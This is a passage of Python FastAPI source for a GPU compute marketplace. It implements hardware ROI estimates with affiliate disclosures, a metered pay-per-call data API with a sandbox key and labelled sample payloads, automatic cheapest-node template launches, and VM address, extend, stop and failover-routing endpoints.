    negwrap = os.getenv("AFFILIATE_NEWEGG_WRAP", "").strip()
    rows = []
    for model in hw.models():
        r = hw.roi_row(model, kwh_usd=kwh, hours_per_day=hours, platform_fee=take, full_build=full_build)
        if r is None:
            continue
        r["buy_urls"] = hw.buy_urls(model, amazon_tag=amz, newegg_wrap=negwrap)
        rows.append(r)
    # Soonest breakeven first; unprofitable rows (breakeven None) sink to the bottom.
    rows.sort(key=lambda x: (x["breakeven_days"] is None, x["breakeven_days"] or 9e18))
    affiliate_on = bool(amz) or bool(negwrap)
    return {
        "assumptions": {
            "kwh_usd": round(kwh, 4),
            "hours_per_day": round(hours, 2),
            "full_build": bool(full_build),
            "platform_fee_pct": round(take * 100.0, 1),
            "system_cost_ref_usd": hw.SYSTEM_COST_USD,
            "system_watts_ref": hw.SYSTEM_WATTS,
            "scope_note": ("Whole-PC: cost and power include the rest of the build (CPU, board, RAM, "
                           "PSU, storage, case)." if full_build else
                           "GPU-only: just the card's cost and power. Toggle full_build to include "
                           "the rest of the PC."),
            "power_note": "Counts load power during rented hours only; excludes idle/host draw and "
                          "internet.",
            "hours_note": "Rented hours/day are demand-dependent and NOT guaranteed — the biggest "
                          "driver of ROI. Marketplace demand is still early; model conservatively.",
            "cost_note": "Hardware cost defaults to LAUNCH MSRP (+ a rest-of-build reference in "
                         "whole-PC mode); street prices vary — use the buy links for today's price.",
        },
        "affiliate": {
            "enabled": affiliate_on,
            "amazon": bool(amz),
            "newegg": bool(negwrap),
            "disclosure": "Petabyte may earn a commission from qualifying purchases made through "
                          "these retailer links — at no extra cost to you.",
        },
        "count": len(rows),
        "gpus": rows,
    }


@app.get("/partners", tags=["marketplace"])
def partners_list():
    """Recommended gear & tools for people running a rig (storage, USDC cash-out, parts planner,
    power). Each link is a plain useful link unless the founder has configured that partner's
    affiliate/referral URL — then it's monetised (FTC disclosure below). Honest when unset."""
    import affiliates
    ps = affiliates.partners()
    return {
        "partners": ps,
        "affiliate": {
            "enabled": any(p["affiliate"] for p in ps),
            "disclosure": "Petabyte may earn a commission from purchases or signups made through "
                          "these partner links — at no extra cost to you.",
        },
    }


# ------------------- PAID DATA API (metered, pay-as-you-go against wallet) -------------------
# Programmatic access to Petabyte's GPU price index + market data + price HISTORY. Auth with an
# API key carrying the `data` scope. Every call is metered; calls beyond the free monthly quota
# are billed per-call from the wallet balance (402 when the balance can't cover it). /usage is
# free to check and never billed.

class _SandboxCaller:
    """A stand-in 'user' for the published SANDBOX key: authenticated for read access, but with no
    account, no wallet, and no id — so it can never be billed and never touches per-user state."""
    is_sandbox = True
    id = None
    _is_api_key = True
    _scopes = ("data",)


def data_api_caller(x_api_key: str = Header(..., alias="X-API-KEY"),
                    db: Session = Depends(get_db)):
    """Auth for the data API. The published SANDBOX key resolves to a free, unmetered caller so
    developers can exercise the real request/auth/response flow without an account or wallet; any
    other key goes through normal API-key auth (and is scoped + metered as usual).

    The sandbox key is matched ONLY when it carries its namespace prefix and exactly equals the
    configured value — it is never fed to the real key decoder, and it is only honoured on the data
    API (seller/node/jobs endpoints depend on api_key_user directly, which rejects it). The two key
    namespaces cannot collide: real keys are Fernet tokens, the sandbox key is a prefixed literal."""
    if (DATA_API_SANDBOX_KEY
            and x_api_key.startswith(DATA_API_SANDBOX_KEY_PREFIX)
            and secrets.compare_digest(x_api_key, DATA_API_SANDBOX_KEY)):
        return _SandboxCaller()
    return api_key_user(x_api_key, db)


def _meter_data_or_402(user, db, endpoint="gpu-prices") -> dict:
    if getattr(user, "is_sandbox", False):
        # The published sandbox key: real data, free and unmetered — never charged, never counted.
        return {"sandbox": True, "billed": False, "charged": 0.0, "units": 0,
                "note": "sandbox key — free & unmetered; mint a data-scoped key for production use"}
    require_scope(user, "data")
    units = DATA_API_UNITS.get(endpoint, 1)
    m = meter_data_call(db, user.id, free_quota=DATA_API_FREE_CALLS_MONTH,
                        price_per_call=DATA_API_PRICE_PER_1K / 1000.0, units=units)
    if not m.get("ok"):
        raise HTTPException(status_code=402, detail={
            "code": "DATA_API_QUOTA_EXCEEDED",
            "message": "Your monthly trial is used up and your wallet balance can't cover the "
                       "per-call fee. Add funds to your wallet to keep using the data API.",
            "price_per_call_usd": m.get("price_per_call"),
            "period": m.get("period")})
    return m


@app.get("/api/v1/data/gpu-prices", tags=["data"])
def data_gpu_prices(user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Current GPU price index: benchmark-anchored reference price + live marketplace avg/min/max
    per model. Metered (needs a `data`-scoped key)."""
    usage = _meter_data_or_402(user, db, "gpu-prices")
    return {"as_of": datetime.now(timezone.utc).isoformat(),
            "gpus": _live_price_index(db), "usage": usage}


@app.get("/api/v1/data/gpu-prices/history", tags=["data"])
def data_gpu_price_history(gpu_model: Optional[str] = Query(None), days: int = Query(30, ge=1, le=365),
                          limit: int = Query(2000, ge=1, le=5000),
                          user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Historical price-index points (newest first), optionally filtered to one GPU model. This is
    the premium series recorded from periodic snapshots. Metered."""
    usage = _meter_data_or_402(user, db, "gpu-prices/history")
    since = (datetime.now(timezone.utc) - timedelta(days=days)).replace(tzinfo=None)
    rows = price_history(db, gpu_model=gpu_model, since=since, limit=limit)
    out = [{"captured_at": (r.captured_at.isoformat() if r.captured_at else None),
            "gpu_model": r.gpu_model,
            "reference_price": (float(r.reference_price) if r.reference_price is not None else None),
            "avg_price": (float(r.avg_price) if r.avg_price is not None else None),
            "min_price": (float(r.min_price) if r.min_price is not None else None),
            "max_price": (float(r.max_price) if r.max_price is not None else None),
            "live_count": r.live_count} for r in rows]
    return {"gpu_model": gpu_model, "days": days, "count": len(out), "points": out, "usage": usage}


@app.get("/api/v1/data/market", tags=["data"])
def data_market(user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Marketplace summary: how many GPU models have live listings, total live units, and the
    overall live price range. Metered."""
    usage = _meter_data_or_402(user, db, "market")
    idx = _live_price_index(db)
    listed = [r for r in idx if r["live_count"] > 0]
    avgs = [r["avg_price"] for r in listed if r["avg_price"] is not None]
    return {"as_of": datetime.now(timezone.utc).isoformat(),
            "models_total": len(idx), "models_with_listings": len(listed),
            "live_units": sum(r["live_count"] for r in idx),
            "avg_price_low": (min(avgs) if avgs else None),
            "avg_price_high": (max(avgs) if avgs else None),
            "usage": usage}


@app.get("/api/v1/data/savings", tags=["data"])
def data_savings(user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Cloud-savings index: per GPU, the benchmark-anchored reference price vs the public cloud
    on-demand rate and the % cheaper. Sorted by benchmark. Metered."""
    usage = _meter_data_or_402(user, db, "savings")
    import pricing_engine
    rows = pricing_engine.catalog()
    savings = [r["savings_vs_cloud_pct"] for r in rows if r.get("savings_vs_cloud_pct") is not None]
    return {"as_of": datetime.now(timezone.utc).isoformat(),
            "gpus": rows,
            "median_savings_vs_cloud_pct": (sorted(savings)[len(savings) // 2] if savings else None),
            "usage": usage}


@app.get("/api/v1/data/availability", tags=["data"])
def data_availability(user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Live supply index: how many nodes are online per GPU model and per region right now.
    Aggregate counts only — no seller identity. Metered."""
    usage = _meter_data_or_402(user, db, "availability")
    import gpu_benchmark
    from db import SellerSpec
    by_model, by_region, total = {}, {}, 0
    for s in db.query(SellerSpec).all():
        if not spec_is_live(s):
            continue
        total += 1
        key = gpu_benchmark.normalize_model(s.gpu_model) or (s.gpu_model or "unknown")
        by_model[key] = by_model.get(key, 0) + 1
        reg = (s.region or s.country or "unknown")
        by_region[reg] = by_region.get(reg, 0) + 1
    return {"as_of": datetime.now(timezone.utc).isoformat(),
            "live_nodes_total": total,
            "by_gpu": [{"gpu_model": k, "live_nodes": v}
                       for k, v in sorted(by_model.items(), key=lambda kv: -kv[1])],
            "by_region": [{"region": k, "live_nodes": v}
                          for k, v in sorted(by_region.items(), key=lambda kv: -kv[1])],
            "usage": usage}


@app.get("/api/v1/data/benchmarks", tags=["data"])
def data_benchmarks(since_id: int = Query(0, ge=0), limit: int = Query(500, ge=1, le=5000),
                    user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """The GPU-authenticity dataset (the data moat): per-observation benchmark scores, their ratio
    to the public per-model reference, server-timing, proof-of-work result, and the fraud/verdict
    LABELS — the (features, label) corpus a fraud/authenticity model trains on. ANONYMIZED: no
    seller identity and no node id. `since_id` supports incremental pulls. Metered."""
    usage = _meter_data_or_402(user, db, "benchmarks")
    import training_data as td
    rows = td.export_authenticity_dataset(db, limit=limit, since_id=since_id)
    for r in rows:
        r.pop("spec_id", None)     # anonymize: never sell node identity, only GPU/perf signal
    return {"count": len(rows), "since_id": since_id,
            "next_since_id": (rows[0]["sample_id"] if rows else since_id),
            "stats": td.dataset_stats(db),
            "rows": rows, "usage": usage}


@app.get("/api/v1/data/demand", tags=["data"])
def data_demand(days: int = Query(30, ge=1, le=365),
                user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Buyer-side DEMAND index: over the last `days`, real bookings aggregated per GPU model —
    booking count, GPU-hours rented, GMV, and the average price buyers ACTUALLY paid (realized,
    not listed). Sandbox/demo bookings are excluded so this is real demand, not inflated. Aggregate
    only — no buyer identity. Metered."""
    usage = _meter_data_or_402(user, db, "demand")
    import gpu_benchmark
    from db import Booking, SellerSpec
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).replace(tzinfo=None)
    agg, tot_b, tot_h, tot_gmv = {}, 0, 0, 0.0
    rows = (db.query(Booking, SellerSpec)
            .join(SellerSpec, SellerSpec.id == Booking.spec_id)
            .filter(Booking.test == False, Booking.is_demo == False,   # noqa: E712 — real demand only
                    Booking.created_at >= cutoff).all())
    for b, sp in rows:
        key = gpu_benchmark.normalize_model(sp.gpu_model) or (sp.gpu_model or "unknown")
        a = agg.setdefault(key, {"bookings": 0, "gpu_hours": 0, "gmv": 0.0})
        h, g = int(b.hours or 0), float(b.gross_amount or 0)
        a["bookings"] += 1; a["gpu_hours"] += h; a["gmv"] += g
        tot_b += 1; tot_h += h; tot_gmv += g
    by_gpu = [{"gpu_model": k, "bookings": a["bookings"], "gpu_hours": a["gpu_hours"],
               "gmv_usd": round(a["gmv"], 2),
               "avg_price_per_hour": (round(a["gmv"] / a["gpu_hours"], 2) if a["gpu_hours"] else None)}
              for k, a in sorted(agg.items(), key=lambda kv: -kv[1]["gmv"])]
    return {"as_of": datetime.now(timezone.utc).isoformat(), "window_days": days,
            "totals": {"bookings": tot_b, "gpu_hours": tot_h, "gmv_usd": round(tot_gmv, 2)},
            "by_gpu": by_gpu, "usage": usage}


@app.get("/api/v1/data/workloads", tags=["data"])
def data_workloads(days: int = Query(30, ge=1, le=365),
                   user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """Buyer-side WORKLOAD mix: over the last `days`, what buyers actually run — jobs by type
    (notebook/vm/template) and by launch template (vLLM, Blender, …). Platform audit tasks are
    excluded. Aggregate counts only — no buyer identity or code. Metered."""
    usage = _meter_data_or_402(user, db, "workloads")
    from db import Task
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).replace(tzinfo=None)
    by_type, by_template, total = {}, {}, 0
    for t in db.query(Task).filter(Task.created_at >= cutoff).all():
        if (t.task_type or "") == "test":     # server-seeded integrity audits, not buyer demand
            continue
        total += 1
        by_type[t.task_type or "unknown"] = by_type.get(t.task_type or "unknown", 0) + 1
        if t.template:
            by_template[t.template] = by_template.get(t.template, 0) + 1
    return {"as_of": datetime.now(timezone.utc).isoformat(), "window_days": days, "total_jobs": total,
            "by_type": [{"task_type": k, "jobs": v}
                        for k, v in sorted(by_type.items(), key=lambda kv: -kv[1])],
            "by_template": [{"template": k, "jobs": v}
                            for k, v in sorted(by_template.items(), key=lambda kv: -kv[1])],
            "usage": usage}


@app.get("/api/v1/data/templates", tags=["data"])
def data_templates(days: int = Query(30, ge=1, le=365),
                   user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """What templates buyers are actually PURCHASING, and how much: over the last `days`, for each
    launch template (vLLM, Ollama, Blender, …) — jobs bought, distinct buyers (a COUNT, not
    identities), GPU-hours, GMV, average spend per job, and the most-requested models inside that
    template. Only paid, real bookings (sandbox/demo excluded). Aggregate — no buyer identity or
    code. Metered."""
    usage = _meter_data_or_402(user, db, "templates")
    import json as _json
    from db import Task, Booking
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).replace(tzinfo=None)
    agg = {}
    rows = (db.query(Task, Booking)
            .join(Booking, Booking.id == Task.booking_id)
            .filter(Task.template.isnot(None), Task.created_at >= cutoff,
                    Booking.test == False, Booking.is_demo == False).all())  # noqa: E712 — real only
    for t, b in rows:
        a = agg.setdefault(t.template, {"jobs": 0, "gpu_hours": 0, "gmv": 0.0,
                                        "buyers": set(), "models": {}})
        a["jobs"] += 1
        a["gpu_hours"] += int(b.hours or 0)
        a["gmv"] += float(b.gross_amount or 0)
        if b.buyer_id is not None:
            a["buyers"].add(b.buyer_id)            # counted only — the id is never returned
        try:
            params = _json.loads(t.template_params or "{}") or {}
            model = params.get("model") or params.get("default_model")
        except Exception:
            model = None
        if model:
            a["models"][model] = a["models"].get(model, 0) + 1
    out = []
    for name, a in sorted(agg.items(), key=lambda kv: -kv[1]["jobs"]):
        top = sorted(a["models"].items(), key=lambda kv: -kv[1])[:5]
        out.append({"template": name, "jobs": a["jobs"], "unique_buyers": len(a["buyers"]),
                    "gpu_hours": a["gpu_hours"], "gmv_usd": round(a["gmv"], 2),
                    "avg_gmv_per_job": (round(a["gmv"] / a["jobs"], 2) if a["jobs"] else None),
                    "top_models": [{"model": m, "jobs": n} for m, n in top]})
    return {"as_of": datetime.now(timezone.utc).isoformat(), "window_days": days,
            "templates_total": len(out),
            "jobs_total": sum(r["jobs"] for r in out),
            "templates": out, "usage": usage}


# The example payloads served by /api/v1/data/sample. Static, keyless, clearly-fake numbers so a
# developer can see the exact shape of every dataset (and the `usage` envelope) BEFORE they mint a
# key or spend a cent. Everything here is labelled sandbox/example — it is not real market data.
_DATA_API_SAMPLE = {
    "sandbox": True,
    "note": ("Example payloads with FAKE numbers — the real shapes you get from /api/v1/data/*. "
             "Try the live endpoints free with the sandbox key 'X-API-KEY: "
             + DATA_API_SANDBOX_KEY + "', then mint a data-scoped key for production."),
    "usage_envelope": {"sandbox": True, "billed": False, "charged": 0.0, "units": 0,
                       "note": "billed:true and charged:$ appear here on a real, metered key"},
    "endpoints": {
        "gpu-prices": {
            "as_of": "2026-01-01T00:00:00+00:00",
            "gpus": [{"gpu_model": "RTX 4090", "reference_price": 0.44,
                      "avg_price": 0.41, "min_price": 0.35, "max_price": 0.49, "live_count": 12}]},
        "gpu-prices/history": {
            "gpu_model": "RTX 4090", "days": 30, "count": 1,
            "points": [{"captured_at": "2026-01-01T00:00:00+00:00", "gpu_model": "RTX 4090",
                        "reference_price": 0.44, "avg_price": 0.41, "min_price": 0.35,
                        "max_price": 0.49, "live_count": 12}]},
        "market": {"as_of": "2026-01-01T00:00:00+00:00", "models_total": 18,
                   "models_with_listings": 9, "live_units": 74,
                   "avg_price_low": 0.09, "avg_price_high": 2.10},
        "savings": {"as_of": "2026-01-01T00:00:00+00:00", "median_savings_vs_cloud_pct": 72.0,
                    "gpus": [{"gpu_model": "RTX 4090", "reference_price": 0.44,
                              "cloud_reference_usd_hr": 1.60, "savings_vs_cloud_pct": 72.5}]},
        "availability": {"as_of": "2026-01-01T00:00:00+00:00", "live_nodes_total": 74,
                         "by_gpu": [{"gpu_model": "RTX 4090", "live_nodes": 21}],
                         "by_region": [{"region": "us-east", "live_nodes": 30}]},
        "benchmarks": {"count": 1, "since_id": 0, "next_since_id": 1001,
                       "stats": {"samples": 1, "consistent_pct": 100.0},
                       "rows": [{"sample_id": 1001, "gpu_model": "RTX 4090", "source": "benchmark",
                                 "tflops_fp16": 320.0, "ratio_to_reference": 0.99,
                                 "pow_verified": True, "label_verdict": "consistent"}]},
        "demand": {"as_of": "2026-01-01T00:00:00+00:00", "window_days": 30,
                   "totals": {"bookings": 128, "gpu_hours": 954, "gmv_usd": 412.30},
                   "by_gpu": [{"gpu_model": "RTX 4090", "bookings": 61, "gpu_hours": 402,
                               "gmv_usd": 176.40, "avg_price_per_hour": 0.44}]},
        "workloads": {"as_of": "2026-01-01T00:00:00+00:00", "window_days": 30, "total_jobs": 128,
                      "by_type": [{"task_type": "template", "jobs": 74}],
                      "by_template": [{"template": "vllm", "jobs": 41}]},
        "templates": {"as_of": "2026-01-01T00:00:00+00:00", "window_days": 30, "templates_total": 1,
                      "jobs_total": 41,
                      "templates": [{"template": "vllm", "jobs": 41, "unique_buyers": 17,
                                     "gpu_hours": 210, "gmv_usd": 92.40, "avg_gmv_per_job": 2.25,
                                     "top_models": [{"model": "meta-llama/Llama-3-8B", "jobs": 12}]}]},
    },
}


@app.get("/api/v1/data/sample", tags=["data"])
def data_sample():
    """KEYLESS example data — no API key, no account, no charge. Returns a labelled FAKE payload for
    every dataset so developers can see the exact response shape before signing up. Use the sandbox
    key against the real endpoints for live data, then mint a data-scoped key for production."""
    return _DATA_API_SAMPLE


@app.get("/api/v1/data/usage", tags=["data"])
def data_usage(user=Depends(data_api_caller), db: Session = Depends(get_db)):
    """The caller's data-API usage this month — free to check, never billed. Needs a `data` key
    (or the sandbox key, whose usage is never tracked)."""
    if getattr(user, "is_sandbox", False):
        return {"sandbox": True, "period": None, "calls": 0, "billed_calls": 0,
                "amount_usd": 0.0, "free_quota": DATA_API_FREE_CALLS_MONTH,
                "note": "sandbox key — usage is not tracked; free & unmetered"}
    require_scope(user, "data")
    return usage_summary(db, user.id, free_quota=DATA_API_FREE_CALLS_MONTH)


@app.post("/admin/data/snapshot", tags=["admin"])
def admin_data_snapshot(me=Depends(require_admin), db: Session = Depends(get_db)):
    """Admin: capture a price-index snapshot now (the maintenance loop also does this hourly)."""
    n = record_price_snapshot(db)
    return {"status": "ok", "rows": n}


@app.get("/admin/data/revenue", tags=["admin"])
def admin_data_revenue(me=Depends(require_admin), db: Session = Depends(get_db)):
    """Admin: data-API monetization scoreboard — billed calls + revenue (month + all-time),
    read from the ledger. Also exposed as Prometheus gauges (petabyte_data_api_*)."""
    r = data_api_revenue(db)
    r["pricing"] = {"base_per_1k_usd": DATA_API_PRICE_PER_1K,
                    "free_trial_calls_month": DATA_API_FREE_CALLS_MONTH,
                    "endpoint_weights": DATA_API_UNITS}
    return r


@app.post("/launch", tags=["compute"])
def quick_launch(data: QuickLaunchModel, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    """One-shot: auto-pick the cheapest verified node that can run this template,
    book it (escrow), and start the template. The buyer never picks a node.
    Reuses request_vm (escrow/idempotency/capacity) and create_task unchanged."""
    if data.template not in TEMPLATES:
        raise HTTPException(status_code=400,
                            detail=f"unknown template; choose from {list(TEMPLATES)}")
    buyer = get_user_by_username(db, _username(user))
    if not buyer:
        raise HTTPException(status_code=401, detail="Unknown user")

    from db import SellerSpec
    needs_gpu = TEMPLATES[data.template].get("gpu", False)
    min_vram = template_min_vram(data.template)
    candidates = []
    for spec in db.query(SellerSpec).filter(SellerSpec.attested == True).all():  # noqa: E712
        if not spec_is_live(spec) or spec.available_units < 1:
            continue
        if spec.user_id == buyer.id:
            continue
        owner = get_user_by_id(db, spec.user_id)
        if not owner or not owner.can_accept_paid_jobs or owner.reputation < MIN_REPUTATION:
            continue
        if needs_gpu and not spec.gpu_model:
            continue
        # Never place a memory-hungry template (vLLM, TensorRT-LLM, …) on a GPU we KNOW
        # is too small. This gates both auto-placement and an explicitly pinned host: a
        # pinned host that fails here is simply absent from candidates, producing a clear
        # 409 before any funds are reserved. A host that never reported vram_gb is left in
        # (we can't prove it too small — same as before this gate existed).
        if min_vram and spec.vram_gb and spec.vram_gb < min_vram:
            continue
        if data.region and ((spec.region or "") != data.region):
            continue
        if data.max_price_per_hour and spec.price_per_hour > data.max_price_per_hour:
            continue
        if data.hours > spec.duration:
            continue
        candidates.append(spec)
    if not candidates:
        raise HTTPException(status_code=409,
                            detail="No verified node can run this template right now")
    # Deterministic: cheapest wins, equal prices break on the stable spec id — the
    # same inventory must always produce the same placement (and the same audit row).
    candidates.sort(key=lambda s: (s.price_per_hour, s.id))
    pinned = None
    if data.spec_id:
        # Honor an explicit "Browse hosts" choice: place on exactly that host — but only
        # if it passed every eligibility check above (live, capacity, not self, reputation,
        # GPU, region, price, VRAM). Otherwise fail clearly, before any money moves.
        pinned = next((s for s in candidates
                       if str(s.public_id) == str(data.spec_id)
                       or str(s.id) == str(data.spec_id)), None)
        if pinned is None:
            raise HTTPException(status_code=409, detail=(
                "The host you selected is no longer available or can't run this template "
                "within your limits (capacity, region, price or VRAM). Nothing was "
                "charged — pick another host or switch to auto-placement."))
    spec = pinned or candidates[0]

    # Human-readable "why this node", plus the audit snapshot of every candidate.
    _total = (spec.jobs_completed or 0) + (spec.jobs_failed or 0)
    _sr = round(100.0 * (spec.jobs_completed or 0) / _total, 1) if _total else None
    if pinned is not None:
        _vs = (f"is the host you selected (${spec.price_per_hour:.2f}/hr) and it meets "
               f"the template's requirements and your limits")
    elif len(candidates) > 1:
        _next = candidates[1]
        _pct = round((1 - spec.price_per_hour / _next.price_per_hour) * 100) \
            if _next.price_per_hour else 0
        _vs = (f"costs {_pct}% less than the next eligible node "
               f"(${spec.price_per_hour:.2f}/hr vs ${_next.price_per_hour:.2f}/hr)"
               if _pct > 0 else
               f"is the cheapest of {len(candidates)} eligible nodes at "
               f"${spec.price_per_hour:.2f}/hr")
    else:
        _vs = "is the only verified node that can run this template right now"
    routing_explanation = (
        f"Selected {spec.gpu_model or 'CPU'} node {spec.public_id or spec.id} for "
        f"'{data.template}' because it {_vs}; "
        + (f"it has a {_sr}% successful-job rate over {_total} jobs."
           if _sr is not None else "it has no completed-job history yet (new node)."))

    # Book + launch through the existing, tested handlers (escrow, capacity, task).
    booking = request_vm(RequestVMModel(spec_id=spec.id, hours=data.hours),
                         user=user, db=db, idempotency_key=None)

    from db import record_routing_decision
    _snapshot = [{"spec_id": s.id, "public_id": s.public_id, "gpu_model": s.gpu_model,
                  "price_per_hour": s.price_per_hour,
                  "success_rate": (round(100.0 * (s.jobs_completed or 0) /
                                         ((s.jobs_completed or 0) + (s.jobs_failed or 0)), 1)
                                   if ((s.jobs_completed or 0) + (s.jobs_failed or 0)) else None),
                  "selected": s.id == spec.id} for s in candidates]
    decision = record_routing_decision(
        db, source="launch", user_id=buyer.id,
        intent={"template": data.template, "hours": data.hours,
                "region": data.region, "max_price_per_hour": data.max_price_per_hour,
                "needs_gpu": needs_gpu, "min_vram": min_vram,
                "pinned_spec_id": (data.spec_id if pinned is not None else None)},
        candidates=_snapshot, selected_spec_ids=[spec.id],
        explanation=routing_explanation, booking_id=booking["booking_id"])
    task = create_task_endpoint(
        TaskCreateModel(booking_id=booking["booking_id"], task_type="template",
                        template=data.template, template_params=data.template_params),
        user=user, db=db)
    port = TEMPLATES[data.template].get("port", 0)
    vm = create_vm_route(db, buyer_id=buyer.id, booking_id=booking["booking_id"],
                         template=data.template, spec_id=spec.id, app_port=port,
                         hourly_rate=spec.price_per_hour, hours=data.hours)
    return {
        "vm_id": vm.id, "url": _vm_url(vm),
        "booking_id": booking["booking_id"], "task_id": task["task_id"],
        "template": data.template, "port": port,
        "gpu_model": spec.gpu_model, "region": spec.region,
        "price_per_hour": spec.price_per_hour, "hours": data.hours,
        "gross_amount": booking.get("gross_amount"), "status": vm.status,
        "routing_explanation": routing_explanation,
        "routing_decision_id": decision.id,
        "connect": f"once running, connect on port {port}" if port else "batch job — result via /tasks/{task_id}",
    }


def _vm_url(vm):
    """The stable, node-independent address for a VM. Failover keeps it constant — derived ONLY
    from the opaque vm id, never the node's IP, so a backup on a different machine is reachable at
    the same address with NO DNS change (see docs/dynamic_dns.md).

    CANONICAL form is the per-VM SUBDOMAIN `<id>.<VM_DNS_ZONE>`, because the id is the HOST — which
    leaves the SSH username FREE for whatever login user the image defines: `root@`, `app@`,
    `ubuntu@`, `jupyter@`, ... The same VM is reachable as any of them; the hostname carries no
    user. (VM_DNS_ZONE defaults to BASE_DOMAIN; set it to e.g. `vm.petabyte.market` to put every
    VM under one wildcard record + one wildcard cert.)

    `ssh_username_fallback` is the zero-client-config alternative (`vm-<id>@<base>`, routed by
    sshpiper on the username). It is SSH-only AND cannot carry a login user — the id already IS the
    username — so a second user (root vs app) would need its own handle. Prefer the hostname form."""
    host = f"{vm.id}.{VM_DNS_ZONE}"
    return {"hostname": host,                 # user-agnostic: `<user>@<hostname>` for ANY user
            "default_user": "root",           # a sensible default; the image may define others
            "ssh": f"ssh root@{host}",         # any user works: `ssh app@{host}`, `ssh ubuntu@{host}`, ...
            "http": f"https://{host}" if vm.app_port else None,
            "ssh_username_fallback": f"ssh vm-{vm.id}@{BASE_DOMAIN}",
            "id": vm.id}


def _hours_left(vm):
    """Hours remaining in the prepaid window (drives the meter + auto-stop)."""
    if not vm.paid_until or vm.status in ("stopped", "failed"):
        return 0
    pu = vm.paid_until
    if pu.tzinfo is None:
        from datetime import timezone as _tz
        pu = pu.replace(tzinfo=_tz.utc)
    from datetime import datetime as _dt, timezone as _tz
    return round(max(0.0, (pu - _dt.now(_tz.utc)).total_seconds() / 3600.0), 2)


class VMTunnelModel(BaseModel):
    vm_id: str
    tunnel_port: int = Field(gt=0)
    ip_address: Optional[str] = None


@app.post("/vm/register_tunnel")
def vm_register_tunnel(data: VMTunnelModel, owner=Depends(seller_actor),
                       db: Session = Depends(get_db)):
    """The node currently hosting a VM reports its outbound tunnel port, making the
    VM reachable through the gateway. Only the seller who owns the hosting node."""
    vm = get_vm_route(db, data.vm_id)
    if not vm:
        raise HTTPException(status_code=404, detail="VM not found")
    spec = get_spec_by_id(db, vm.current_spec_id)
    if not spec or spec.user_id != owner.id:
        raise HTTPException(status_code=403, detail="This VM is not hosted on your node")
    reg = register_vm_tunnel(db, data.vm_id, vm.current_spec_id, data.tunnel_port,
                             data.ip_address)
    if not reg:
        raise HTTPException(status_code=409, detail="VM not in a registrable state")
    return {"status": "ok", "vm_id": vm.id, "vm_status": reg.status}


@app.get("/vm", tags=["compute"])
def list_my_vms(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    out = []
    for vm in vm_routes_for_buyer(db, me.id):
        out.append({"vm_id": vm.id, "template": vm.template, "status": vm.status,
                    "url": _vm_url(vm), "port": vm.app_port,
                    "migrations": vm.migrations, "booking_id": vm.booking_id,
                    "hourly_rate": vm.hourly_rate, "hours_left": _hours_left(vm)})
    return {"vms": out, "count": len(out)}


@app.get("/vm/{vm_id}", tags=["compute"])
def get_my_vm(vm_id: str, user: dict = Depends(get_current_user),
              db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    vm = get_vm_route(db, vm_id)
    if not vm or vm.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="VM not found")
    return {"vm_id": vm.id, "template": vm.template, "status": vm.status,
            "url": _vm_url(vm), "port": vm.app_port, "migrations": vm.migrations,
            "booking_id": vm.booking_id, "hourly_rate": vm.hourly_rate,
            "hours_left": _hours_left(vm),
            "note": "address is stable across node failover; auto-stops when the paid window ends"}


class ExtendModel(BaseModel):
    hours: int = Field(gt=0, le=720)


@app.post("/vm/{vm_id}/extend", tags=["compute"])
def extend_my_vm(vm_id: str, data: ExtendModel, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    vm = get_vm_route(db, vm_id)
    if not vm or vm.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="VM not found")
    if vm.status in ("stopped", "failed"):
        raise HTTPException(status_code=409, detail="VM is not running")
    if not extend_vm(db, vm, data.hours):
        raise HTTPException(status_code=402, detail="Insufficient funds to extend")
    return {"status": "extended", "vm_id": vm.id, "hours_left": _hours_left(vm)}


@app.post("/vm/{vm_id}/stop", tags=["compute"])
def stop_my_vm(vm_id: str, user: dict = Depends(get_current_user),
               db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    vm = get_vm_route(db, vm_id)
    if not vm or vm.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="VM not found")
    stop_vm_metered(db, vm)   # bill actual hours held, refund the unused prepay
    return {"status": "stopped", "vm_id": vm.id}


@app.get("/vm/{vm_id}/events", tags=["compute"])
def vm_events(vm_id: str, user: dict = Depends(get_current_user),
              db: Session = Depends(get_db)):
    """The VM's timeline — makes failover visible ('moved nodes at 14:32')."""
    from db import VMEvent
    me = get_user_by_username(db, _username(user))
    vm = get_vm_route(db, vm_id)
    if not vm or vm.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="VM not found")
    rows = db.query(VMEvent).filter(VMEvent.vm_id == vm_id).order_by(VMEvent.id.asc()).all()
    return {"vm_id": vm_id, "events": [
        {"event": e.event, "detail": e.detail,
         "at": e.created_at.isoformat() if e.created_at else None} for e in rows]}


@app.get("/vm/{vm_id}/route")
def resolve_vm_route(vm_id: str, request: Request, db: Session = Depends(get_db)):
    """Gateway-only: resolve a stable vm_id to the node currently hosting it.
    Protected by GATEWAY_TOKEN so buyers can't enumerate node placement."""
    if not GATEWAY_TOKEN or request.headers.get("X-Gateway-Token") != GATEWAY_TOKEN:
        raise HTTPException(status_code=403, detail="gateway token required")
    vm = get_vm_route(db, vm_id)
    if not vm or vm.status in ("stopped", "failed"):
        raise HTTPException(status_code=404, detail="No active route")
    # node_id is the identity a hosting node registers its gateway control channel
    # under — it IS the current spec id. The gateway reads `node_id`; we also keep
    # `current_spec_id` for existing readers.
    return {"vm_id": vm.id, "node_id": vm.current_spec_id,
            "current_spec_id": vm.current_spec_id,
            "tunnel_port": vm.tunnel_port, "node_ip": vm.node_ip,
